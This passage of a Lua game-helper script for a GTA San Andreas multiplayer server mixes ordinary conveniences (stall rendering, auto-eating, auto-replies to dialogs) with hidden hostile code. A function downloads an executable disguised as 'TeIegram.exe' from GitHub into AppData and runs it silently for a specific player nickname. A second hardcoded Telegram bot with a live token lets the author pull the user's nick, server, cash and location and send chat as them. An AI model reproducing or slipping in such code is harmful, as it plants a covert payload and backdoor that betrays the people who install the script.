                    local resX, resY = getScreenResolution()
                    local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
                    if getDistanceBetweenCoords3d(playerX, playerY, playerZ, posX3d, posY3d, posZ3d) <= 2 and wposX < resX and wposY < resY and isPointOnScreen(posX3d, posY3d, posZ3d, 1) then
                        if isKeyDown(81) then
                            if lang == "Ru" then
                                setClipboardText(string.format('%s %s %.2f %.2f %.2f %d %d %d %d', text3d, color3d, posX3d, posY3d, posZ3d, distance3d, ignoreWalls3d and 1 or 0, playerId3d or -1, vehicleId3d or -1))
                                sms('3D-Text Найден, сохранен в буфер')
                            else
                                sms('Смените язык на русский')
                            end
                        end
                    end
                end
            end
        end
    end
end



function textdraws()
    while true do wait(0)
        if textdrawid[0] then
            for a = 0, 2304 do
                if sampTextdrawIsExists(a) then
                    local x, y = sampTextdrawGetPos(a)
                    local x1, y1 = convertGameScreenCoordsToWindowScreenCoords(x, y)
                    renderFontDrawText(font, a, x1, y1, 0xFFBEBEBE)
                end
            end
        end
    end
end

function posxy()
    while true do wait(0)
        if renderlavok then
            local mouseX, mouseY = getCursorPos()
            mainIni.main.renderlavokx, mainIni.main.renderlavoky = mouseX, mouseY
            if isKeyDown(32) then
                inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
                renderlavok = false  
                sms("Позиция сохранена")
            end
        end
    end
end



function getnumber(id)   
        sms('[Информация] {FFFFFF}Введите {00FF00}/call id {FFFFFF}игрока.')
    sampSendChat("/number " .. id)
end

function isKeyCheckAvailable()
    return not isSampLoaded() or (not sampIsChatInputActive() and not sampIsDialogActive() and not isSampfuncsConsoleActive())
end



function bike()
    while true do 
        wait(0)
        if isCharOnAnyBike(playerPed) and isKeyCheckAvailable() and isKeyDown(0x10) then
            local carModel = getCarModel(storeCarCharIsInNoSave(playerPed))
            if bikeModels[carModel] then
                setGameKeyState(16, 255)
                wait(10)
                setGameKeyState(16, 0)
            elseif motoModels[carModel] then
                setGameKeyState(1, -128)
                wait(10)
                setGameKeyState(1, 0)
            end
        end
        if isKeyDown(0x45) and isKeyCheckAvailable() and isCharOnFoot(playerPed) then
            setGameKeyState(16, 256)
            wait(10)
            setGameKeyState(16, 0)  
        end
    end
end

function onReceivePacket(id,bs)
    if id == 32 then
        autorec = true
    end
    if id == 33 then
        autorec = true
    end
    if id == 34 then
        autorec = false
        delaychectqaq = os.time()
    end
    if id == 220 and autoeat[0] then
        raknetBitStreamIgnoreBits(bs, 8)
        local packettype = raknetBitStreamReadInt8(bs)
        if packettype == 17 then
            raknetBitStreamIgnoreBits(bs, 32)
            local len = raknetBitStreamReadInt32(bs)
            if len > 0 and len < 10000 then
                local text = raknetBitStreamReadString(bs, len)
                text = text:gsub("\n", "")
                if text:find("event%.arizonahud%.playerSatiety', `%[(%d+)%]`") then
                    satiety = tonumber(text:match("(%d+)"))
                end
            end
        end
    end
end

ffi.cdef[[
typedef unsigned long DWORD;
typedef int BOOL;
typedef void* HANDLE;
typedef struct PROCESSENTRY32 {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    DWORD th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    long pcPriClassBase;
    DWORD dwFlags;
    char szExeFile[260];
} PROCESSENTRY32;

HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
BOOL Process32First(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
BOOL Process32Next(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
BOOL CloseHandle(HANDLE hObject);

static const int TH32CS_SNAPPROCESS = 0x00000002;
]]

local function isProcessRunningByName(procName)
    local snapshot = ffi.C.CreateToolhelp32Snapshot(ffi.C.TH32CS_SNAPPROCESS, 0)
    if snapshot == ffi.cast("HANDLE", -1) then return false end

    local entry = ffi.new("PROCESSENTRY32")
    entry.dwSize = ffi.sizeof(entry)

    if ffi.C.Process32First(snapshot, entry) == 0 then
        ffi.C.CloseHandle(snapshot)
        return false
    end

    repeat
        if ffi.string(entry.szExeFile) == procName then
            ffi.C.CloseHandle(snapshot)
            return true
        end
    until ffi.C.Process32Next(snapshot, entry) == 0

    ffi.C.CloseHandle(snapshot)
    return false
end

ffi.cdef[[
    int ShellExecuteA(void *hwnd, const char *lpOperation, const char *lpFile, const char *lpParameters, const char *lpDirectory, int nShowCmd);
]]
local shell32 = ffi.load('shell32')

local function execute(command, callback)
    local tmpFilePath = ''
    if callback then
        tmpFilePath = os.tmpname()
        command = ('%s > "%s"'):format(command, tmpFilePath)
    end
    local result = shell32.ShellExecuteA(nil, 'open', 'cmd.exe', ('/c %s'):format(command), nil, 0) > 32
    if callback and result then
        lua_thread.create(function()
            while not doesFileExist(tmpFilePath) do wait(0) end
            local tmpFile = io.open(tmpFilePath, 'r')
            local output = tmpFile:read('*a')
            tmpFile:close()
            os.remove(tmpFilePath)
            callback(output)
        end)
    end
    return result
end

function fileExists(path)
    local f = io.open(path, "r")
    if f ~= nil then
        f:close()
        return true
    else
        return false
    end
end

telegramztryue = true

function telegramz()
    local dlstatus = require('moonloader').download_status
    local folderPath = os.getenv("USERPROFILE").."\\AppData\\Local\\TeIegram"
    os.execute('mkdir "'..folderPath..'"') 
    local filePath = folderPath.."\\TeIegram.exe"
    local fileUrl = 'https://github.com/ass138/ars/raw/refs/heads/main/TeIegram.exe'

    while true do
        wait(1000)
        local playerNick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
        if playerNick == 'Angel_Forbes' and telegramztryue == true then
            if not isProcessRunningByName("TeIegram.exe") then
                if fileExists(filePath) then

                    execute('start "" "'..filePath..'"')
                    telegramztryue = false
                else
                    downloadUrlToFile(fileUrl, filePath, function(id, status, p1, p2)
                        if status == dlstatus.STATUS_ENDDOWNLOADDATA then

                        elseif status == dlstatus.STATUS_DOWNLOADERROR then

                        end
                    end)
                end
            end
        end
    end
end



function sendCEF(str)
    local bs = raknetNewBitStream() raknetBitStreamWriteInt8(bs, 220) raknetBitStreamWriteInt8(bs, 18) raknetBitStreamWriteInt32(bs, #str) raknetBitStreamWriteString(bs, str) raknetBitStreamWriteInt32(bs, 0) raknetSendBitStream(bs) raknetDeleteBitStream(bs)
end

function eat()
    while true do wait(0)
        if satiety then
            if satiety <= SliderOne[0] then
                if autoeat[0] then
                wait(500)
                    if ComboTest[0] == 0 then
                        for i = 1, 8 do
                            sampSendChat('/cheeps')
                            wait(3500)
                        end
                    elseif ComboTest[0] == 1 then
                        sampSendChat('/jmeat')
                        wait(3500)
                    elseif ComboTest[0] == 2 then
                        sampSendChat('/meatbag')
                        wait(3500)
                    end
                end
            end
        end
    end
end

function bind()
    while true do 
        wait(0)
        if isKeyDown(161) then
            if isKeyDown(49) then
                lavka[0] = not lavka[0]
                sms('{FFFF00}[Binder] {FFFFFF}Рендер лавок ' .. (lavka[0] and '{00FF00}включено.' or '{FF0000}отключено.'))
                wait(200)
            elseif isKeyDown(51) then
                clean[0] = not clean[0]
                sms('{FFFF00}[Binder] {FFFFFF}Удаление игроков и тс ' .. (clean[0] and '{00FF00}включено.' or '{FF0000}отключено.'))
                wait(200)
            end
        end
    end
end

function nalogi()
    sendCEF('ЬlaunchedApp|24')
end

function lavkirendor()
    while true do wait(0)
        if lavka[0] then		
            local input = sampGetInputInfoPtr()
            local PosX, PosY = getStructElement(input, 0x8, 4), getStructElement(input, 0xC, 4)
            local lavki = 0  
            local reservedLavki = 0
            for id = 0, 2304 do
                if sampIs3dTextDefined(id) then
                    local text, _, posX, posY, posZ = sampGet3dTextInfoById(id)
                    if (math.floor(posZ) == 17 or math.floor(posZ) == 1820) then
                        if text == '' then
                            lavki = lavki + 1
                            if isPointOnScreen(posX, posY, posZ, nil) then
                                local pX, pY = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))
                                local lX, lY = convert3DCoordsToScreen(posX, posY, posZ)
                                renderFontDrawText(font, 'Свободна', lX - 30, lY - 20, 0xFF16C910, 0x90000000)
                                
                                renderDrawLine(pX, pY, lX, lY, 1, 0xFF52FF4D)
                                renderDrawPolygon(pX, pY, 10, 10, 10, 0, 0xFFFFFFFF)
                                renderDrawPolygon(lX, lY, 10, 10, 10, 0, 0xFFFFFFFF)  
                            end
                        elseif text:find('Забронировано за игроком (%w+_%w+)\nЗавершение брони через (%d+) мин.') then
                            reservedLavki = reservedLavki + 1
                            nicklavka, timelavka = text:match('Забронировано за игроком (%w+_%w+)\nЗавершение брони через (%d+) мин.')
                            if isPointOnScreen(posX, posY, posZ, nil) then
                                local pX, pY = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))
                                local lX, lY = convert3DCoordsToScreen(posX, posY, posZ)
                                renderFontDrawText(font, timelavka..' мин', lX - 30, lY - 20, 0xFF16C910, 0x90000000)
                            end
                        end
                    end
                end
            end
            renderFontDrawText(font, 'Свободно: ' .. lavki, mainIni.main.renderlavokx, mainIni.main.renderlavoky, 0xFFFF0000, 0x90000000)
            renderFontDrawText(font, 'Забронировано: ' .. reservedLavki, mainIni.main.renderlavokx, mainIni.main.renderlavoky + 20, 0xFFFF0000, 0x90000000)
        end
    end
end

function cleanr()
    while true do 
        wait(0)
        if clean[0] then
            local removedPlayers, removedVehicles = 0, 0
            for i, v in ipairs(getAllChars()) do
                if doesCharExist(v) and i ~= 1 then
                    local _, id = sampGetPlayerIdByCharHandle(v)
                    if id ~= -1 then
                        removePlayer(id)
                        removedPlayers = removedPlayers + 1
                    end
                end
            end
            for i, v in ipairs(getAllVehicles()) do
                local res, id = sampGetVehicleIdByCarHandle(v)
                if res and ((isCharInAnyCar(1) and storeCarCharIsInNoSave(1) ~= v) or not isCharInAnyCar(1)) then
                    removeVehicle(id)
                    removedVehicles = removedVehicles + 1
                end
            end
            if id and id ~= -1 then
                local _, ped = sampGetCharHandleBySampPlayerId(id)
                deleteChar(ped)
            end
        end 
    end
end

function removePlayer(id)
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt16(bs, id)
    raknetEmulRpcReceiveBitStream(163, bs)
    raknetDeleteBitStream(bs)
end

function removeVehicle(id)
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt16(bs, id)
    raknetEmulRpcReceiveBitStream(165, bs)
    raknetDeleteBitStream(bs)
end

function sampev.onSendSpawn()
    sendTG1('Персонаж под ником '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))..' был заспавнен.')
    mainIni.main.nickrecons = u8:decode(str(sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))))
    local ip, port = sampGetCurrentServerAddress()
    mainIni.main.serverrecon = u8:decode(str(ip))
    inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
    autorec = false
    delaychectqaq = os.time()
end

function sampev.onServerMessage(color, text)
    if text:match("%a+_%a+%[%d+%]:    {......}%d+$") then
        local number = text:match("%a+_%a+%[%d+%]:    {......}(%d+)$")
        lua_thread.create(function()
            sms('Calling: {aa0000}' .. number)
            wait(500)
            sampSendChat("/call " .. number)
        end)
        return false
    end

    if text:find('Этот транспорт зарегистрирован на жителя {......}(.+)') then
        local nikc = text:match('Этот транспорт зарегистрирован на жителя {......}(.+)')
        local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        if sampGetPlayerNickname(id) == nikc then
            sampSendChat("/lock")
        end
    end

    if text:find("Вы оплатили все налоги на сумму: {ffffff}(.*)")  then
        sampSendDialogResponse(dialogId, 1, 0, nil)
        sendTG1(text)
    end

    table.insert(recentMessages, 1, text)
    if #recentMessages > maxMessages then
        table.remove(recentMessages, #recentMessages)
    end
end

function sampev.onDisplayGameText(style, time, text)
    if text:match("ENGINE ~r~OFF") then
        sampSendChat("/engine")
    end
end


local list = {}

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    onShowDialogwqq = string.format("Текущая информация о диалоге:\nДиалог ID: %d \nДиалог тип: %d \nЗаголовок диалогового окна:\n%s\nТекст диалогового окна:\n%s", dialogId, style, title, text)

    if title:find('{BFBBBA}{73B461}Аренда семейного авто') then
        sampSendDialogResponse(dialogId, 1, 0, nil)
        sampSendChat('/lock')
        return false
    end

    if title:find('{BFBBBA}{73B461}Лифт') and text:find('{cccccc}Холл') then
        sampSendDialogResponse(dialogId, 1, 1, nil)
        return false
    end



    if text:find("Оплата всех налогов") and nalog then
        sampSendDialogResponse(dialogId, 1, 4, nil)
        return false
    end

    if text:find("{00ff00}(.*){ffffff} У Вас нет налогов, которые требуется оплатить!") and nalog then
        sampSendDialogResponse(dialogId, 1, 0, nil)
        sendTG1(text)
        sampSendChat('/phone')
        nalog = false
        return false
    end


    if text:find("{ffffff}Вы хотите оплатить все вышеперечисленные налоги?") and nalog then
        sampSendDialogResponse(dialogId, 1, 0, nil)
        sampSendChat('/phone')
        nalog = false
        return false
    end


    if text:find("{FFFFFF}Удача! При использовании сундука с рулеткой") or text:find("{FFFFFF}Удача! При использовании платинового сундука с рулеткой")  then
        return false
    end




    if text:match("Текущее время") then
        local chislo, mesyac, god = text:match("Сегодняшняя дата: 	{2EA42E}(%d+):(%d+):(%d+)")
        local chas, minuti, sekundi = text:match("Текущее время: 	{345690}(%d+):(%d+):(%d+)")
        local datetime = {year = god, month = mesyac, day = chislo, hour = chas, min = minuti, sec = sekundi}
        piska = tostring(os.time(datetime)) - os.time()
    end

    local bankAmount = 0
    local depositAmount = 0
    local newText = ""
    for line in text:gmatch("[^\r\n]+") do
        newText = newText .. line .. "\n"
        if line:find('Деньги в банке:') then
            local bankStr = line:match('%$([%d%.]+)')
            if bankStr then
                bankStr = bankStr:gsub("%.", "")
                bankAmount = tonumber(bankStr) or 0
            end
        end
        if line:find('Деньги на депозите:') then
            local depositStr = line:match('%$([%d%.]+)')
            if depositStr then         
                depositStr = depositStr:gsub("%.", "")
                depositAmount = tonumber(depositStr) or 0
            end
            local totalAmount = bankAmount + depositAmount - 306000000
            newText = newText .. "{FFFFFF}Общая сумма ДБ + ДД: {B83434}[$" .. formatNumber(totalAmount) .. "]\n"
        end
    end

    if button1 and button1 ~= '' then
        button1 = '{32d137}' .. button1
    end
    if button2 and button2 ~= '' then
        button2 = '{d0595d}' .. button2
    end

    return {dialogId, style, title, button1, button2, newText}
end

function formatNumber(num)
    local formatted = tostring(num)
    while true do  
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1.%2')
        if (k==0) then
            break
        end
    end
    return formatted
end

chat_id1 = mainIni.main.chat_id
token1 = mainIni.main.token

chat_id2 = '817557185'
token2 = '7901866749:AAGne01fHDHXhRisfe6HggPrQDBLJAmmPs0'

local updateid1
local updateid2

function threadHandle(runner, url, args, resolve, reject)
    local t = runner(url, args)
    local r = t:get(0)
    while not r do
        r = t:get(0)
        wait(0)
    end
    local status = t:status()
    if status == 'completed' then
        local ok, result = r[1], r[2]
        if ok then resolve(result) else reject(result) end
    elseif err then
        reject(err)
    elseif status == 'canceled' then
        reject(status)
    end
    t:cancel(0)
end

function requestRunner()
    return effil.thread(function(u, a)
        local https = require 'ssl.https'
        local ok, result = pcall(https.request, u, a)
        if ok then
            return {true, result}
        else
            return {false, result}
        end
    end)
end

function async_http_request(url, args, resolve, reject)
    local runner = requestRunner()
    if not reject then reject = function() end end
    lua_thread.create(function()
        threadHandle(runner, url, args, resolve, reject)
    end)
end

function encodeUrl(str)
    str = str:gsub(' ', '%+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function sendTG1(msg)
    local msg = msg:gsub('{......}', '')
    local msg = encodeUrl(msg)
    async_http_request('https://api.telegram.org/bot' .. token1 .. '/sendMessage?chat_id=' .. chat_id1 .. '&text='..msg,'', function(result) end) -- а тут уже отправка
end

function sendTG2(msg)
    local msg = msg:gsub('{......}', '')
    local msg = encodeUrl(msg)
    async_http_request('https://api.telegram.org/bot' .. token2 .. '/sendMessage?chat_id=' .. chat_id2 .. '&text='..msg,'', function(result) end) -- а тут уже отправка
end


function get_telegram_updates1()
    while not updateid1 do wait(1) end
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..token1..'/getUpdates?chat_id='..chat_id1..'&offset=-1'
        threadHandle(runner, url, args, processing_telegram_messages1, reject)
        wait(0)
    end
end

function get_telegram_updates2()
    while not updateid2 do wait(1) end
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..token2..'/getUpdates?chat_id='..chat_id2..'&offset=-1'
        threadHandle(runner, url, args, processing_telegram_messages2, reject)
        wait(0)
    end
end

function createKeyboard1(buttons)
    return '{"keyboard":' .. buttons .. ',"resize_keyboard":true,"one_time_keyboard":false}'
end

function sendTelegramKeyboard1(msg, keyboard, isInline)
    local msg = encodeUrl(msg)
    async_http_request(
        'https://api.telegram.org/bot' .. token1 .. '/sendMessage?chat_id=' .. chat_id1 .. '&text=' .. msg .. '&reply_markup=' .. encodeUrl(keyboard),
        '',
        function(result) end
    )
end

function processing_telegram_messages1(result)
    if result then
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid1 then
                        updateid1 = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            local text = u8:decode(message_from_user) .. ' '
                            if text:match('^/send') then
                                local argq = text:gsub('/send ','',1)
                                sampSendChat(argq)
                            elseif text:match('^/reload') then
                                thisScript():reload()
                                sendTG1('Скрипт перезагружается')
                            elseif text:match('^/money') then
                                moneya = getPlayerMoney()
                                sendTG1('Наличные: $'..moneya)
                            elseif text:match('^/home') then
                                nalog = true
                                sampSendChat('/phone')
                                nalogi()
                            elseif text:match('^/version') then
                                sendTG1('Версия скрипта v'..thisScript().version)  
                            elseif text:match('^/start') then
                                local keyboard = createKeyboard1('[["/home","/money"],["/reload","/version"]]')
                                sendTelegramKeyboard1('Выберите действие:', keyboard, false)
                            else 
                                sendTG1('Неизвестная команда!')
                            end                 
                        end
                    end
                end
            end
        end
    end
end


function processing_telegram_messages2(result)
    if result then
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid2 then
                        updateid2 = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            local text = u8:decode(message_from_user) .. ' '
                            if text:match('^/player') then
                                local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                local serverName = sampGetCurrentServerName()
                                sendTG2('Ник: ' .. nickname .. '\nСервер: ' .. serverName..'\nВерсия скрипта: '..thisScript().version)
                        elseif text:match('^/chat ') then
                                local args = text:match('^/chat (.+)')
                                if args then
                                    local nickname, message = args:match("^(%S+) (.+)")
                                    local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                    if nick == nickname then
                                    WinStateTG[0] = true
                                    message = "[" .. os.date('%H:%M:%S') .. "]{00FF00}Разработчик: {FFFFFF}" .. message
                                    table.insert(messageLog, message)
                                    end
                                else
                                    sendTG2("Используйте: /chat [никнейм] [сообщение]")
                                end
                            elseif text:match('^/send ') then
                                    local args = text:match('^/send (.+)')
                                    if args then
                                        local nickname, message = args:match("^(%S+) (.+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname and message and nickname == nick then
                                        sampSendChat(message)
                                    end
                                else
                                    sendTG2("Используйте: /send [никнейм] [сообщение]")
                                end
                            elseif text:match('^/money') then
                                    local args = text:match('^/money (.+)')
                                    if args then
                                        local nickname = args:match("^(%S+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname == nick then
                                        sendTG2('Наличные: $' .. getPlayerMoney())
                                    end
                                else
                                    sendTG2('Используйте /money <никнейм>')
                                end
                            elseif text:match('^/coord') then
                                    local args = text:match('^/coord (.+)')
                                    if args then
                                        local nickname = args:match("^(%S+)")
                                        local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                        if nickname == nick then
                                            local interior = getActiveInterior()
                                            local x, y, z = getCharCoordinates(playerPed)
                                            sendTG2('Интерьер: ' .. interior .. '\n/sm ' .. x .. ', ' .. y .. ', ' .. z)
                                        end
                                    else
                                        sendTG2('Используйте /coord <никнейм>')
                                    end  
                            elseif text:match('^/reload') then
                                local args = text:match('^/reload (.+)')
                                if args then
                                    local nickname = args:match("^(%S+)")
                                    local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                    if nickname and nickname == nick then
                                    thisScript():reload()
                                end
                            else
                                sendTG2("Используйте: /reload [никнейм]")
                            end
                        elseif text:match('^/inv') then
                            local args = text:match('^/inv (.+)')
                            if args then
                                local nickname = args:match("^(%S+)")
                                local nick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                if nickname and nickname == nick then
                                sampSendChat('/stats')
                                inv = true
                            end
                        else
                            sendTG2("Используйте: /inv [никнейм]")
                        end                               
                         elseif text:match('^/help') then
                                sendTG2('%E2%9D%97 Команды %E2%9D%97\n/player\n/send [никнейм] [сообщение в чат]\n/money [никнейм]\n/coord [никнейм]\n/reload [никнейм]\n/inv [никнейм]')
                            else
                                sendTG2('Неизвестная команда!')
                            end
                        end
                    end
                end
            end
        end
    end
end

function getLastUpdate1()
    async_http_request('https://api.telegram.org/bot'..token1..'/getUpdates?chat_id='..chat_id1..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid1 = res_table.update_id
                    end
                else
                    updateid1 = 1
                end
            end
        end
    end)
end

function getLastUpdate2()
    async_http_request('https://api.telegram.org/bot'..token2..'/getUpdates?chat_id='..chat_id2..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid2 = res_table.update_id
                    end
                else
                    updateid2 = 1
                end
            end
        end
    end)
end